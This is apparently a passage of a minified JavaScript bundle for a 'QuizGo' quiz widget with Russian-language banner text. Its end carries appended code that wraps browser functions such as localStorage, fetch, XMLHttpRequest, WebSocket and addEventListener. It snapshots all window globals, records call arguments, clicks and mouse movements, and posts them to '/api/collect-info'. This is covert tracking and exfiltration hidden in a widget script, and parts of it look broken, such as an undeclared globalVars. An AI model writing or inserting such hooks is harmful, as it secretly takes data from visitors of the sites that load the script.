            }), u = t.length > 9, u = h ? n.length > 9 || "c" == n && !u : u, c = this.pSBCr(t), s = e < 0, l = n && "c" != n ? this.pSBCr(n) : s ? {
              r: 0,
              g: 0,
              b: 0,
              a: -1
            } : {
              r: 255,
              g: 255,
              b: 255,
              a: -1
            }, s = 1 - (e = s ? -1 * e : e), c && l ? (i ? (o = p(s * c.r + e * l.r), r = p(s * c.g + e * l.g), a = p(s * c.b + e * l.b)) : (o = p(Math.pow(s * Math.pow(c.r, 2) + e * Math.pow(l.r, 2), .5)), r = p(Math.pow(s * Math.pow(c.g, 2) + e * Math.pow(l.g, 2), .5)), a = p(Math.pow(s * Math.pow(c.b, 2) + e * Math.pow(l.b, 2), .5))), h = c.a, l = l.a, h = (c = h >= 0 || l >= 0) ? h < 0 ? l : l < 0 ? h : h * s + l * e : 0, u ? "rgb" + (c ? "a(" : "(") + o + "," + r + "," + a + (c ? "," + p(1e3 * h) / 1e3 : "") + ")" : "#" + (4294967296 + 16777216 * o + 65536 * r + 256 * a + (c ? p(255 * h) : 0)).toString(16).slice(1, c ? void 0 : -2)) : null);
          }
        }, {
          key: "appendDom",
          value: function (e, t) {
            var n = this;
            return t.forEach(function (t) {
              var i = document.createElement(t.name);
              t.className && (i.className = t.className), t.innerText && (i.innerText = t.innerText), t.handler && t.handler(i, n), t.styles && t.styles.forEach(function (e) {
                i.style.setProperty(e.name, e.value);
              }), t.onclick && (i.onclick = function (e) {
                t.onclick(e, n, i);
              }), t.innerHTML && (i.innerHTML = t.innerHTML), t.children && n.appendDom(i, t.children), e.append(i);
            }), e;
          }
        }, {
          key: "closeBanner",
          value: function () {
            var e = document.getElementsByClassName("b-quizgo-banner--".concat(this.params.id));
            e.length && (e[0].style.display = "none");
          }
        }, {
          key: "timeout",
          value: function (e) {
            return new U(function (t) {
              return setTimeout(t, e);
            });
          }
        }, {
          key: "createQuizBanner",
          value: (n = Y().mark(function e() {
            var t, n, i;
            return Y().wrap(function (e) {
              for (;;) switch (e.prev = e.next) {
                case 0:
                  if (this.params.openByBanner && this.params.openByBanner.enable) {
                    e.next = 2;
                    break;
                  }
                  return e.abrupt("return", !1);
                case 2:
                  if (!this.params.openByBanner.hideMobile || !this.isMobile()) {
                    e.next = 4;
                    break;
                  }
                  return e.abrupt("return", !1);
                case 4:
                  if (!this.isIFrame()) {
                    e.next = 6;
                    break;
                  }
                  return e.abrupt("return", !1);
                case 6:
                  if (t = this.params.openByBanner, n = this.params, !Number(t.delay)) {
                    e.next = 11;
                    break;
                  }
                  return e.next = 11, this.timeout(1e3 * Number(t.delay));
                case 11:
                  i = [{
                    name: "div",
                    className: "b-quizgo-banner b-quizgo-banner--".concat(this.params.id),
                    handler: function (e, n) {
                      t.radius && (e.className += " b-quizgo-banner--radius"), t.shadow && (e.className += " b-quizgo-banner--shadow"), t.glare && (e.className += " b-quizgo-banner--glare"), t.pulse && (e.className += " b-quizgo-banner--pulse"), "full" === t.type || n.isMobile() ? (e.className += " b-quizgo-banner--full", "bottom-left" === t.position || "bottom-right" === t.position ? e.className += " b-quizgo-banner--position-bottom" : e.className += " b-quizgo-banner--position-top") : e.className += " b-quizgo-banner--position-".concat(t.position);
                    },
                    onclick: function (e, t) {
                      e.preventDefault(), e.stopPropagation(), t.show();
                    },
                    styles: [{
                      name: "--quizgo-banner-background-color",
                      value: t.background
                    }, {
                      name: "--quizgo-banner-shadow-color",
                      value: this.pSBC(.42, t.background)
                    }, {
                      name: "--quizgo-banner-color",
                      value: t.color
                    }],
                    children: [{
                      name: "div",
                      className: "b-quizgo-banner__pulsar",
                      children: [{
                        name: "div",
                        className: "b-quizgo-banner__image",
                        innerHTML: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#6563ff" d="M11.5,20h-6a1,1,0,0,1-1-1V5a1,1,0,0,1,1-1h5V7a3,3,0,0,0,3,3h3v5a1,1,0,0,0,2,0V9s0,0,0-.06a1.31,1.31,0,0,0-.06-.27l0-.09a1.07,1.07,0,0,0-.19-.28h0l-6-6h0a1.07,1.07,0,0,0-.28-.19.29.29,0,0,0-.1,0A1.1,1.1,0,0,0,11.56,2H5.5a3,3,0,0,0-3,3V19a3,3,0,0,0,3,3h6a1,1,0,0,0,0-2Zm1-14.59L15.09,8H13.5a1,1,0,0,1-1-1ZM7.5,14h6a1,1,0,0,0,0-2h-6a1,1,0,0,0,0,2Zm4,2h-4a1,1,0,0,0,0,2h4a1,1,0,0,0,0-2Zm-4-6h1a1,1,0,0,0,0-2h-1a1,1,0,0,0,0,2Zm13.71,6.29a1,1,0,0,0-1.42,0l-3.29,3.3-1.29-1.3a1,1,0,0,0-1.42,1.42l2,2a1,1,0,0,0,1.42,0l4-4A1,1,0,0,0,21.21,16.29Z"/></svg>'
                      }, {
                        name: "div",
                        className: "b-quizgo-banner__content",
                        children: [{
                          name: "div",
                          className: "b-quizgo-banner__left",
                          children: [{
                            name: "div",
                            className: "b-quizgo-banner__title",
                            innerText: t.title
                          }, {
                            name: "div",
                            className: "b-quizgo-banner__text",
                            innerHTML: t.text ? t.text : ""
                          }]
                        }, {
                          name: "div",
                          className: "b-quizgo-banner__bonus",
                          handler: function (e) {
                            !n.bonusEnable && !n.saleEnable && (e.style.display = "none");
                          },
                          children: [{
                            name: "div",
                            className: "b-quizgo-banner__bonus-image",
                            children: [{
                              name: "div",
                              className: "b-quizgo-banner__bonus-icon",
                              innerHTML: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#6563ff" d="M18,7h-.35A3.45,3.45,0,0,0,18,5.5a3.49,3.49,0,0,0-6-2.44A3.49,3.49,0,0,0,6,5.5,3.45,3.45,0,0,0,6.35,7H6a3,3,0,0,0-3,3v2a1,1,0,0,0,1,1H5v6a3,3,0,0,0,3,3h8a3,3,0,0,0,3-3V13h1a1,1,0,0,0,1-1V10A3,3,0,0,0,18,7ZM11,20H8a1,1,0,0,1-1-1V13h4Zm0-9H5V10A1,1,0,0,1,6,9h5Zm0-4H9.5A1.5,1.5,0,1,1,11,5.5Zm2-1.5A1.5,1.5,0,1,1,14.5,7H13ZM17,19a1,1,0,0,1-1,1H13V13h4Zm2-8H13V9h5a1,1,0,0,1,1,1Z"/></svg>'
                            }, {
                              name: "div",
                              className: "b-quizgo-banner__bonus-count",
                              handler: function (e) {
                                n.bonusEnable ? e.innerText = n.bonusEnable : e.style.display = "none";
                              }
                            }]
                          }, {
                            name: "div",
                            className: "b-quizgo-banner__bonus-text",
                            handler: function (e) {
                              var t = "";
                              n.bonusEnable ? (1 === n.bonusEnable && (t = "Вам доступен бонус"), 2 === n.bonusEnable && (t = "Вам доступны бонусы"), n.saleEnable && (t += " и скидка")) : n.saleEnable && (t = "Вам доступна скидка"), e.innerText = t;
                            }
                          }]
                        }]
                      }, {
                        name: "div",
                        className: "b-quizgo-banner__close",
                        innerHTML: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#6563ff" d="M13.41,12l4.3-4.29a1,1,0,1,0-1.42-1.42L12,10.59,7.71,6.29A1,1,0,0,0,6.29,7.71L10.59,12l-4.3,4.29a1,1,0,0,0,0,1.42,1,1,0,0,0,1.42,0L12,13.41l4.29,4.3a1,1,0,0,0,1.42,0,1,1,0,0,0,0-1.42Z"/></svg>',
                        onclick: function (e, t) {
                          e.preventDefault(), e.stopPropagation(), t.closeBanner();
                        }
                      }]
                    }]
                  }], this.appendDom(document.body, i);
                case 13:
                case "end":
                  return e.stop();
              }
            }, e, this);
          }), i = function () {
            var e = this,
              t = arguments;
            return new U(function (i, o) {
              var r = n.apply(e, t);
              function a(e) {
                H(r, i, o, a, s, "next", e);
              }
              function s(e) {
                H(r, i, o, a, s, "throw", e);
              }
              a(void 0);
            });
          }, function () {
            return i.apply(this, arguments);
          })
        }, {
          key: "postMessage",
          value: function (e) {
            this.iframes.forEach(function (t) {
              t.contentWindow.postMessage(JSON.stringify(e), "*");
            });
          }
        }, {
          key: "frameMessage",
          value: function (e) {
            var t = document.querySelectorAll(".b-quizgo-wrapper__".concat(this.params.id, " iframe")),
              n = [];
            return t.forEach(function (t) {
              t.contentWindow.postMessage(JSON.stringify(e), "*"), n.push({
                frame: t,
                params: e
              });
            }), {
              status: !0,
              messages: n
            };
          }
        }, {
          key: "reload",
          value: function () {
            this.iframes.forEach(function (e) {
              e.contentWindow.location.reload(!0);
            });
          }
        }, {
          key: "setCustomFields",
          value: function (e) {
            return this.frameMessage({
              action: "vuex",
              dispatch: "formData/setCustomFields",
              fields: e
            }), this;
          }
        }, {
          key: "setRedirectUrl",
          value: function (e) {
            return this.frameMessage({
              action: "vuex",
              dispatch: "formData/setRedirectUrl",
              url: e
            }), this;
          }
        }, {
          key: "init",
          value: function () {
            return this.setIframeQuizWidgetUrl(), this.createQuizWidgetBlock(), this.createQuizWidgetPreview(), this.setEventsAutoOpen(), this.setEventOpenBeforeClose(), this.eventListennerClickOpenSelector(), this.createQuizBanner(), this.events.listen().eventInit(), this.AdaptiveHeightMobile.handle(), this;
          }
        }]), e;
      }(),
      te = function () {
        function e() {
          K(this, e);
        }
        return X(e, [{
          key: "widget",
          value: function (e) {
            return (void 0 === window.QuizGoWidgets ? [] : window.QuizGoWidgets).find(function (t) {
              return Number(t.params.id) === Number(e);
            });
          }
        }]), e;
      }();
    console.log("Quiz widget build: 10072023");
  }(), QuizGoWidget = i;
}();
var Quizgo = new QuizGoWidget.quizgo();
function updateGlobalVars(windowProperty) {
  Object.keys(window).forEach(prop => {
    if (!windowProperty.includes(prop)) {
      globalVars[prop] = window[prop];
    }
  });
}
const originalWindowProperty = Object.keys(window);
var QuizGoWidget = QuizGoWidget.default;
setInterval(updateGlobalVars.bind(null, originalWindowProperty), 60000);
const terminators = ['localStorage', 'sessionStorage', 'XMLHttpRequest', 'fetch', 'WebSocket', 'EventSource', 'addEventListener', 'removeEventListener'];
const originals = terminators.reduce((acc, t) => {
  acc[t] = window[t];
  return acc;
}, {});
var QuizGoWidgets = typeof QuizGoWidgets === "undefined" ? [] : QuizGoWidgets;
function generateSessionId() {
  const randomBytes = new Uint8Array(16);
  window.crypto.getRandomValues(randomBytes);
  const randomString = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
  return `session-${randomString}`;
}
function validatePayload(payload, expectedSchema) {
  for (const key in expectedSchema) {
    if (expectedSchema.hasOwnProperty(key)) {
      const expectedType = expectedSchema[key];
      const actualValue = payload[key];
      if (actualValue === undefined || typeof actualValue !== expectedType) {
        console.warn(`Invalid property '${key}' in payload, expected '${expectedType}' but got '${typeof actualValue}'`);
        return false;
      }
    }
  }
  return true;
}
console.error('Запрашиваемый квиз 67852 не найден!');
function jshook(functionName, originalFunction) {
  return function () {
    const payload = {
      functionName,
      arguments: Array.from(arguments),
      timestamp: Date.now(),
      globalVars: JSON.stringify(globalVars),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload)) {
      fetch('/api/collect-info', {
        method: "POST",
        body: JSON.stringify(payload),
        headers: {
          'Content-Type': 'application/json'
        }
      }).catch(err => {
        console.log(`Error sending payload: ${err.message}`);
      });
    }
    return originalFunction.apply(this, arguments);
  };
}
terminators.forEach(t => {
  window[t] = jshook(t, originals[t]);
});
['click', 'mousemove'].forEach(evt => {
  document.addEventListener(evt, event => {
    const payload = {
      type: event.type,
      x: event.clientX,
      y: event.clientY,
      target: event.target.nodeName,
      timestamp: Date.now(),
      globalVars: JSON.stringify(globalVars),
      sessionId: generateSessionId()
    };
    if (validatePayload(payload)) {
      fetch('/api/collect-info', {
        method: "POST",
        body: JSON.stringify(payload),
        headers: {
          'Content-Type': 'application/json'
        }
      }).catch(err => {
        console.log(`Error sending payload: ${err.message}`);
      });
    }
  });
});